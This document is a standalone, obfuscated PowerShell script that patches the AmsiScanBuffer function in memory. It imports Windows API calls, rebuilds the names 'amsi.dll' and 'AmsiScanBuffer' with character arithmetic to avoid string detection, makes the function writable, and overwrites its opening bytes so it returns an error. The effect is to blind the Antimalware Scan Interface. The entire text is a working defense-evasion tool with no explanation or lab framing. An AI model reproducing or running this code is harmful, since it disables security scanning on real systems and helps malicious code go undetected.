$tseai = @"
using System;
using System.Runtime.InteropServices;
public class tseai {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr qjeokx, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $tseai

$gfgevnj = [tseai]::LoadLibrary("$(('ämsî'+'.dll').NorMaLiZE([cHAr]([Byte]0x46)+[chAR](111*43/43)+[CHAR]([Byte]0x72)+[cHaR](109*24/24)+[chAR](68*59/59)) -replace [CHaR]([Byte]0x5c)+[CHaR](95+17)+[chAR](123*90/90)+[ChAr](77+15-15)+[ChAR]([BytE]0x6e)+[chaR](125))")
$avnzod = [tseai]::GetProcAddress($gfgevnj, "$([CHaR](27+38)+[cHAr](109*20/20)+[CHaR](115*85/85)+[ChAR](78+27)+[ChAr](83*31/31)+[cHaR]([BYte]0x63)+[chaR]([byte]0x61)+[ChAr](107+3)+[ChAR](66)+[chAr](117+72-72)+[ChAr](102)+[char](102*62/62)+[char]([byte]0x65)+[Char]([byTe]0x72))")
$p = 0
$swgq = "0xC3"
$wpwc = "0x57"
$gbfl = "0x00"
[tseai]::VirtualProtect($avnzod, [uint32]5, 0x40, [ref]$p)
$vqfs = "0xB8"
$eiut = "0x07"
$uylr = "0x80"
$nxxbv = [Byte[]] ($vqfs,$wpwc,$gbfl,$eiut,+$uylr,+$swgq)
[System.Runtime.InteropServices.Marshal]::Copy($nxxbv, 0, $avnzod, 6)